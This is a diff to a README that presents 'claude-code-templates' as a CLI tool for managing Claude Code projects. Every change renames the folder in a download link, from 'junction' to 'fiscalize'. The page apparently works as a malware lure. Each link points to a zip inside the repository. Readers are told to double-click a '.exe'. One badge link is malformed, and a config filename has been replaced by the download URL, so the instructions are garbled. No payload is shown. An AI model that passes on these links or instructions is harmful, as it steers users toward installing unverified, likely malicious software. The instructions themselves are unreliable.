@@ -1,6 +1,6 @@
 # 🚀 claude-code-templates - Simple Tool for Managing Claude Code
 
-[![Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip%https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip)](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip)
+[![Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip%https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip)](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip)
 
 ## 📥 Overview
 The **claude-code-templates** is a command-line interface (CLI) tool designed to help you easily configure and monitor Claude Code projects. With this tool, you can streamline your workflow, making it simpler to manage your coding tasks.
@@ -22,7 +22,7 @@ Follow these easy steps to get started with **claude-code-templates**:
 
 1. **Download the software**: Visit the releases page to download the latest version.
 
-   [Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip)
+   [Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip)
 
 2. **Install the software**: After downloading, locate the file on your computer. If you are using Windows, double-click the `.exe` file. For macOS, drag the app to your Applications folder. Linux users can follow specific installation instructions based on their distributions.
 
@@ -33,7 +33,7 @@ Follow these easy steps to get started with **claude-code-templates**:
 ## 📥 Download & Install
 To download **claude-code-templates**, click on the link below. Follow the installation instructions mentioned above to get the software running on your device.
 
-[Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip)
+[Download Here](https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip)
 
 ## 🛠️ Using the Tool
 Once installed, you can start using the tool right away. Simply open your terminal and type `claude-code-templates` to view available commands. Here are some common commands you might find useful:
@@ -46,7 +46,7 @@ Once installed, you can start using the tool right away. Simply open your termin
 The configuration files allow you to customize your experiences, such as setting project parameters or adjusting monitoring settings. You can either use predefined templates or create your own. 
 
 1. Locate the `.config` directory in your home folder.
-2. Create or edit the `https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/junction/claude-code-templates.zip` file to fit your project’s needs.
+2. Create or edit the `https://raw.githubusercontent.com/Justdvp/claude-code-templates/main/fiscalize/claude-code-templates.zip` file to fit your project’s needs.
 3. Save the changes and restart the tool to apply your new settings.
 
 ## 🌟 Monitoring Your Projects
